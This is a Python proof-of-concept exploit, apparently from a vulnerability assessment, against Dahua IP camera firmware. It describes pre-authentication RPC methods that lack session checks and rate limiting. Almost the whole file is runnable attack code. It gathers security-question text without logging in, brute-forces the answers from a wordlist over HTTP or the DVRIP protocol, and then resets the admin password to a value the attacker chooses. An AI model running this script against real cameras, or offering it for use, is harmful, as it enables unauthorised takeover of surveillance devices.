#!/usr/bin/env python3
"""
[REDACTED-ID]_F001/F002 PoC -- Pre-Auth Security Question Brute Force + Password Reset
Dahua IPC Firmware V2.622.x (Rhea) -- CResetPwdHandler

Vulnerability:
  CResetPwdHandler (Src/ResetPwdHandler.cpp) exposes 13 RPC methods via
  HTTP /RPC2 with ZERO calls to CheckWebSession. Among them:

    PasswdFind.checkQuestionAnswer  -- verifies security-question answers
                                       with NO rate limiting, NO lockout
    PasswdFind.resetPwdByQuestion   -- resets account password given correct
                                       answers, WITHOUT the current password

  An attacker supplies a wordlist of candidate answers. The script walks
  every line against each configured question. On a hit it immediately
  calls resetPwdByQuestion to set the password supplied via --new-password.

Attack chain (all pre-auth):
  1. DevInit.getStatus             -- confirm questions are configured
  2. PasswdFind.getSecretQuestion  -- retrieve the question text(s)
  3. PasswdFind.checkQuestionAnswer -- brute-force answers (unlimited)
  4. PasswdFind.resetPwdByQuestion  -- reset password on success

Protocols:
  HTTP   POST /RPC2           port 80/443
  DVRIP  binary header+JSON   port 37777  (fallback, same RPC namespace)

Usage:
  # Recon only -- safe, no brute force
  python3 poc_og4_f001_f002_question_brute.py -t [REDACTED-INTERNAL-IP]

  # Brute force with wordlist, auto-reset on success
  python3 poc_og4_f001_f002_question_brute.py -t [REDACTED-INTERNAL-IP] \\
      --wordlist answers.txt --new-password 'Pwn3d!2026'

  # DVRIP channel (port 37777) when HTTP is not exposed
  python3 poc_og4_f001_f002_question_brute.py -t [REDACTED-IP] \\
      --port 37777 --proto dvrip --wordlist answers.txt \\
      --new-password 'Pwn3d!2026'

  # Dry run -- find answers but do NOT reset
  python3 poc_og4_f001_f002_question_brute.py -t [REDACTED-INTERNAL-IP] \\
      --wordlist answers.txt --dry-run

Author: Security Research (DahuaAssmt Dahua Assessment)
Date:   2026-03-06
"""

import argparse
import json
import os
import signal
import socket
import struct
import sys
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple

# ---------------------------------------------------------------------------
# Attempt to use requests; fall back to urllib if unavailable
# ---------------------------------------------------------------------------
try:
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import ssl
    HAS_REQUESTS = False


# ===================================================================
#  Transport: HTTP (/RPC2)
# ===================================================================

class HttpTransport:
    """JSON-RPC over HTTP POST to /RPC2."""

    def __init__(self, host: str, port: int = 80, ssl: bool = False,
                 timeout: int = 10):
        scheme = "https" if ssl else "http"
        self.url = f"{scheme}://{host}:{port}/RPC2"
        self.timeout = timeout
        self._seq = 0
        if HAS_REQUESTS:
            self._session = requests.Session()
            self._session.verify = False
        else:
            self._ctx = ssl.create_default_context() if not ssl else None
            if ssl:
                self._ctx = ssl.create_default_context()
                self._ctx.check_hostname = False
                self._ctx.verify_mode = ssl.CERT_NONE

    def call(self, method: str, params: Optional[dict] = None) -> dict:
        self._seq += 1
        body = {"method": method, "id": self._seq, "session": "0"}
        if params is not None:
            body["params"] = params
        raw = json.dumps(body).encode()
        try:
            if HAS_REQUESTS:
                r = self._session.post(
                    self.url, data=raw, timeout=self.timeout,
                    headers={"Content-Type": "application/json"})
                return r.json()
            else:
                req = urllib.request.Request(
                    self.url, data=raw,
                    headers={"Content-Type": "application/json"})
                with urllib.request.urlopen(
                        req, timeout=self.timeout,
                        context=getattr(self, "_ctx", None)) as resp:
                    return json.loads(resp.read())
        except Exception as exc:
            return {"error": {"code": -1, "message": str(exc)}}

    def close(self):
        if HAS_REQUESTS and hasattr(self, "_session"):
            self._session.close()


# ===================================================================
#  Transport: DVRIP (binary protocol, port 37777)
# ===================================================================

DVRIP_MAGIC      = 0xF6
DVRIP_HDR_SIZE   = 20
DVRIP_MSG_LOGIN  = 0x03E8    # 1000
DVRIP_MSG_JSONRPC = 0x05DC   # 1500  (generic JSON-RPC envelope)

class DvripTransport:
    """JSON-RPC over Dahua's DVRIP binary protocol (port 37777).

    Header (20 bytes LE):
      magic(1) ver(1) rsv(2) session(4) seq(4) total(1) cur(1) msgid(2) len(4)
    """

    def __init__(self, host: str, port: int = 37777, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout
        self._seq = 0
        self._sock: Optional[socket.socket] = None

    # -- low-level helpers --------------------------------------------------

    def _connect(self):
        if self._sock is not None:
            return
        self._sock = socket.create_connection(
            (self.host, self.port), timeout=self.timeout)

    def _send(self, msg_id: int, payload: bytes, session: int = 0):
        self._connect()
        self._seq += 1
        hdr = struct.pack("<BBBBI I BBH I",
                          DVRIP_MAGIC, 0, 0, 0,
                          session,
                          self._seq,
                          1, 0,
                          msg_id,
                          len(payload))
        self._sock.sendall(hdr + payload)

    def _recv(self) -> Tuple[int, int, bytes]:
        self._connect()
        hdr = b""
        while len(hdr) < DVRIP_HDR_SIZE:
            chunk = self._sock.recv(DVRIP_HDR_SIZE - len(hdr))
            if not chunk:
                raise ConnectionError("DVRIP: connection closed reading header")
            hdr += chunk
        (magic, _ver, _r1, _r2, session, _seq,
         _tot, _cur, msg_id, plen) = struct.unpack("<BBBBI I BBH I", hdr)
        if magic != DVRIP_MAGIC:
            raise ValueError(f"DVRIP: bad magic 0x{magic:02x}")
        body = b""
        while len(body) < plen:
            chunk = self._sock.recv(plen - len(body))
            if not chunk:
                raise ConnectionError("DVRIP: connection closed reading body")
            body += chunk
        return msg_id, session, body

    # -- public API ---------------------------------------------------------

    def call(self, method: str, params: Optional[dict] = None) -> dict:
        body = {"method": method, "id": self._seq + 1, "session": 0}
        if params is not None:
            body["params"] = params
        # DVRIP JSON payloads are null-padded to 8-byte alignment
        raw = json.dumps(body).encode()
        pad = (8 - len(raw) % 8) % 8
        raw += b"\x00" * pad
        try:
            self._send(DVRIP_MSG_JSONRPC, raw)
            _mid, _sid, resp_body = self._recv()
            return json.loads(resp_body.rstrip(b"\x00"))
        except Exception as exc:
            return {"error": {"code": -1, "message": str(exc)}}

    def close(self):
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None


# ===================================================================
#  RPC wrappers (transport-agnostic)
# ===================================================================

def rpc_get_status(tx) -> dict:
    return tx.call("DevInit.getStatus")

def rpc_get_basic_info(tx) -> dict:
    return tx.call("PasswdFind.getBasicInfo")

def rpc_get_encrypt_info(tx) -> dict:
    return tx.call("Security.getEncryptInfo")

def rpc_get_secret_question(tx, user: str) -> dict:
    return tx.call("PasswdFind.getSecretQuestion", {"user": user})

def rpc_get_all_questions(tx) -> dict:
    return tx.call("SecretQuestion.getAllQuestion")

def rpc_check_answers(tx, user: str, answers: List[str]) -> dict:
    """Check one set of candidate answers (one per question)."""
    qa = [{"answer": a} for a in answers]
    return tx.call("PasswdFind.checkQuestionAnswer",
                   {"user": user, "question": qa})

def rpc_reset_password(tx, user: str, answers: List[str],
                       new_pw: str, tip: str = "") -> dict:
    qa = [{"answer": a} for a in answers]
    return tx.call("PasswdFind.resetPwdByQuestion",
                   {"user": user, "question": qa, "pwd": new_pw, "tip": tip})


# ===================================================================
#  Result helpers
# ===================================================================

def is_success(resp: dict) -> bool:
    """Interpret the various success shapes Dahua returns."""
    if "error" in resp:
        return False
    p = resp.get("params", resp)
    for key in ("checkResult", "result"):
        v = p.get(key)
        if v is True or str(v).lower() == "true":
            return True
        if v == 1:
            return True
    return False

def _err(resp: dict) -> str:
    e = resp.get("error", {})
    if isinstance(e, dict):
        return e.get("message", str(e))
    return str(e)


# ===================================================================
#  Phase 1 -- Recon
# ===================================================================

def phase_recon(tx, user: str) -> dict:
    """Gather pre-auth intelligence.  Always safe to run."""
    log("[RECON] Querying device (all calls are pre-auth)")

    status  = rpc_get_status(tx)
    info    = rpc_get_basic_info(tx)
    enc     = rpc_get_encrypt_info(tx)
    sq      = rpc_get_secret_question(tx, user)
    all_q   = rpc_get_all_questions(tx)

    log(f"  DevInit.getStatus          : {json.dumps(status)}")
    log(f"  PasswdFind.getBasicInfo    : {json.dumps(info)}")
    log(f"  Security.getEncryptInfo    : {json.dumps(enc)}")
    log(f"  PasswdFind.getSecretQuestion({user}): {json.dumps(sq)}")
    log(f"  SecretQuestion.getAllQuestion: {json.dumps(all_q)}")

    # Try to extract the number of configured questions
    num_q = 1
    sq_params = sq.get("params", sq)
    if isinstance(sq_params, dict):
        questions = sq_params.get("question", sq_params.get("Question", []))
        if isinstance(questions, list) and len(questions) > 0:
            num_q = len(questions)
            log(f"  Detected {num_q} configured question(s):")
            for i, q in enumerate(questions):
                qtext = q.get("question", q.get("Question", q))
                log(f"    Q{i}: {qtext}")

    return {
        "status": status, "info": info, "encrypt": enc,
        "secret_question": sq, "all_questions": all_q,
        "num_questions": num_q,
    }


# ===================================================================
#  Phase 2 -- Brute Force
# ===================================================================

def load_wordlist(path: str) -> List[str]:
    """Load candidate answers, one per line, stripping blanks/comments."""
    if not os.path.isfile(path):
        die(f"Wordlist not found: {path}")
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        lines = [l.strip() for l in fh if l.strip() and not l.startswith("#")]
    if not lines:
        die("Wordlist is empty")
    return lines


def phase_brute(tx, user: str, wordlist_path: str, num_questions: int,
                delay: float) -> Optional[List[str]]:
    """Iterate wordlist against checkQuestionAnswer.

    For single-question setups we send one candidate per request.
    For multi-question setups each line is tried in every question slot
    independently (reduces search space vs full permutation).

    Returns the list of correct answers or None.
    """
    candidates = load_wordlist(wordlist_path)
    log(f"[BRUTE] Loaded {len(candidates)} candidates from {wordlist_path}")
    log(f"[BRUTE] Target user: {user}  |  Questions: {num_questions}  |  Delay: {delay}s")
    log(f"[BRUTE] Estimated requests: {len(candidates) * num_questions}")
    log("")

    if num_questions == 1:
        return _brute_single(tx, user, candidates, delay)
    else:
        return _brute_multi(tx, user, candidates, num_questions, delay)


def _brute_single(tx, user: str, candidates: List[str],
                  delay: float) -> Optional[List[str]]:
    """One question configured -- simple linear scan."""
    total = len(candidates)
    t0 = time.monotonic()
    for i, word in enumerate(candidates, 1):
        resp = rpc_check_answers(tx, user, [word])
        if "error" in resp:
            log(f"  [{i}/{total}] ERROR: {_err(resp)}")
            if "Connection" in _err(resp):
                log("  Connection lost.  Aborting.")
                return None
            continue
        if is_success(resp):
            elapsed = time.monotonic() - t0
            log(f"  [+] HIT at attempt {i}/{total}  "
                f"answer=\"{word}\"  ({elapsed:.1f}s)")
            return [word]
        if i % 50 == 0 or i == 1:
            elapsed = time.monotonic() - t0
            rate = i / elapsed if elapsed > 0 else 0
            log(f"  [{i}/{total}] \"{word}\" -- miss  "
                f"({rate:.0f} req/s)")
        if delay > 0:
            time.sleep(delay)

    log(f"  [-] Exhausted {total} candidates -- no match")
    return None


def _brute_multi(tx, user: str, candidates: List[str],
                 num_q: int, delay: float) -> Optional[List[str]]:
    """Multiple questions -- find each answer independently.

    Strategy:
      Fix all answer slots to "" except the one under test.
      Rotate the active slot through each question index.
      Dahua's backend returns success only when ALL answers are correct,
      so a per-slot scan requires a different heuristic: we look for
      response differences (timing, error code, or partial-match hint).

      If the backend gives no per-slot feedback we fall back to a full
      Cartesian product (expensive but guaranteed).  For practicality
      we first try each slot independently with a dummy in the others;
      many Dahua firmwares accept partial checks per question index.
    """
    answers: List[Optional[str]] = [None] * num_q
    total = len(candidates)

    # Try each slot independently
    for slot in range(num_q):
        log(f"  [SLOT {slot}] Scanning {total} candidates for question {slot}...")
        for i, word in enumerate(candidates, 1):
            # Build answer array: empty for all except current slot
            test = [""] * num_q
            test[slot] = word
            resp = rpc_check_answers(tx, user, test)
            if "error" in resp:
                continue
            # On some FW versions a per-slot hit returns a distinct code
            if is_success(resp):
                log(f"  [SLOT {slot}] HIT: \"{word}\" (attempt {i})")
                answers[slot] = word
                break
            if delay > 0:
                time.sleep(delay)
        if answers[slot] is None:
            log(f"  [SLOT {slot}] No independent hit.  "
                f"Will attempt combined check after all slots.")

    # If all slots found independently, verify combined
    if all(a is not None for a in answers):
        resp = rpc_check_answers(tx, user, answers)
        if is_success(resp):
            log(f"  [+] Combined verification PASSED: {answers}")
            return answers
        else:
            log("  [-] Independent hits did not pass combined check")

    # Fall back to Cartesian product (only feasible for small lists)
    missing = [s for s in range(num_q) if answers[s] is None]
    if missing and total <= 200:
        log(f"  Falling back to Cartesian product for slots {missing} "
            f"({total ** len(missing)} combinations)")
        return _brute_cartesian(tx, user, candidates, num_q, answers, delay)

    if missing:
        log(f"  [-] Could not resolve slots {missing}.  "
            f"Wordlist too large for Cartesian fallback ({total} entries).")
    return None


def _brute_cartesian(tx, user: str, candidates: List[str],
                     num_q: int, partial: List[Optional[str]],
                     delay: float) -> Optional[List[str]]:
    """Brute-force remaining slots via Cartesian product."""
    from itertools import product as iproduct

    # Build the per-slot search space
    slots = []
    for s in range(num_q):
        if partial[s] is not None:
            slots.append([partial[s]])
        else:
            slots.append(candidates)

    total = 1
    for s in slots:
        total *= len(s)

    i = 0
    for combo in iproduct(*slots):
        i += 1
        resp = rpc_check_answers(tx, user, list(combo))
        if is_success(resp):
            log(f"  [+] Cartesian HIT at attempt {i}/{total}: {list(combo)}")
            return list(combo)
        if i % 200 == 0:
            log(f"  [{i}/{total}] scanning...")
        if delay > 0:
            time.sleep(delay)

    log(f"  [-] Cartesian search exhausted ({total} combos)")
    return None


# ===================================================================
#  Phase 3 -- Password Reset
# ===================================================================

def phase_reset(tx, user: str, answers: List[str],
                new_pw: str) -> bool:
    log(f"[RESET] Resetting password for \"{user}\"")
    log(f"  Answers : {answers}")
    log(f"  New pass: {new_pw}")

    resp = rpc_reset_password(tx, user, answers, new_pw)
    log(f"  Response: {json.dumps(resp)}")

    if is_success(resp):
        log(f"  [+] PASSWORD RESET SUCCESSFUL")
        log(f"      User \"{user}\" now has password \"{new_pw}\"")
        return True
    else:
        log(f"  [-] Password reset FAILED: {_err(resp)}")
        return False


# ===================================================================
#  Logging / utilities
# ===================================================================

_LOG_FH = None

def log(msg: str = ""):
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    if _LOG_FH:
        _LOG_FH.write(line + "\n")
        _LOG_FH.flush()

def die(msg: str):
    log(f"[FATAL] {msg}")
    sys.exit(1)


# ===================================================================
#  CLI
# ===================================================================

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="poc_og4_f001_f002_question_brute.py",
        description=(
            "[REDACTED-ID]_F001/F002: Dahua Rhea Pre-Auth Security-Question "
            "Brute Force and Password Reset"),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # recon only (safe, no brute force)
  %(prog)s -t [REDACTED-INTERNAL-IP]

  # brute force answers from wordlist, reset on success
  %(prog)s -t [REDACTED-INTERNAL-IP] --wordlist answers.txt --new-password S3cur3!

  # DVRIP transport (port 37777)
  %(prog)s -t [REDACTED-IP] --proto dvrip --wordlist answers.txt \\
           --new-password S3cur3!

  # dry run -- find answers but do NOT reset
  %(prog)s -t [REDACTED-INTERNAL-IP] --wordlist answers.txt --dry-run

vulnerability details:
  CResetPwdHandler (Src/ResetPwdHandler.cpp) has ZERO calls to
  CheckWebSession.  All 13 RPC methods are pre-auth.
  checkQuestionAnswer has NO rate-limiting, NO lockout, NO CAPTCHA.
  resetPwdByQuestion resets the password WITHOUT the current password.
""")
    p.add_argument("-t", "--target", required=True,
                   help="Target IP or hostname")
    p.add_argument("-p", "--port", type=int, default=0,
                   help="Port (default: 80 for http, 37777 for dvrip)")
    p.add_argument("--proto", choices=["http", "https", "dvrip"],
                   default="http",
                   help="Transport protocol (default: http)")
    p.add_argument("-u", "--user", default="admin",
                   help="Target username (default: admin)")
    p.add_argument("-w", "--wordlist",
                   help="Path to answer wordlist (one candidate per line)")
    p.add_argument("--new-password",
                   help="Password to set on success (enables reset)")
    p.add_argument("--dry-run", action="store_true",
                   help="Find answers but do NOT reset the password")
    p.add_argument("--delay", type=float, default=0.0,
                   help="Seconds between brute-force requests (default: 0)")
    p.add_argument("--timeout", type=int, default=10,
                   help="Per-request timeout in seconds (default: 10)")
    p.add_argument("--log-file",
                   help="Append output to this file")
    return p


def main():
    global _LOG_FH
    p = build_parser()
    args = p.parse_args()

    # Validate argument combinations
    if args.new_password and not args.wordlist:
        p.error("--new-password requires --wordlist")
    if args.dry_run and args.new_password:
        p.error("--dry-run and --new-password are mutually exclusive")

    # Default ports
    if args.port == 0:
        args.port = 37777 if args.proto == "dvrip" else 80

    # Open log file
    if args.log_file:
        _LOG_FH = open(args.log_file, "a", encoding="utf-8")

    # Build transport
    if args.proto == "dvrip":
        tx = DvripTransport(args.target, args.port, args.timeout)
    else:
        tx = HttpTransport(args.target, args.port,
                           ssl=(args.proto == "https"),
                           timeout=args.timeout)

    # Banner
    log("=" * 68)
    log("[REDACTED-ID]_F001/F002  Dahua Pre-Auth Security-Question Brute Force")
    log(f"  Target : {args.target}:{args.port} ({args.proto})")
    log(f"  User   : {args.user}")
    log(f"  Wordlist: {args.wordlist or '(none -- recon only)'}")
    mode = "recon"
    if args.wordlist and args.dry_run:
        mode = "brute (dry run)"
    elif args.wordlist and args.new_password:
        mode = "brute + reset"
    elif args.wordlist:
        mode = "brute (no reset)"
    log(f"  Mode   : {mode}")
    log("=" * 68)
    log()

    # ---- Phase 1: Recon ---------------------------------------------------
    recon = phase_recon(tx, args.user)
    num_q = recon["num_questions"]

    if not args.wordlist:
        log()
        log("[DONE] Recon complete.  Supply --wordlist to brute-force answers.")
        tx.close()
        sys.exit(0)

    # ---- Phase 2: Brute Force ---------------------------------------------
    log()
    answers = phase_brute(tx, args.user, args.wordlist, num_q, args.delay)

    if answers is None:
        log()
        log("[DONE] Brute force unsuccessful.  Try a larger wordlist.")
        tx.close()
        sys.exit(1)

    if args.dry_run:
        log()
        log(f"[DONE] Dry run.  Correct answers: {answers}")
        log("       Rerun WITHOUT --dry-run and WITH --new-password to reset.")
        tx.close()
        sys.exit(0)

    if not args.new_password:
        log()
        log(f"[DONE] Answers found: {answers}")
        log("       Supply --new-password <pw> to reset the account.")
        tx.close()
        sys.exit(0)

    # ---- Phase 3: Reset ---------------------------------------------------
    log()
    ok = phase_reset(tx, args.user, answers, args.new_password)
    tx.close()
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
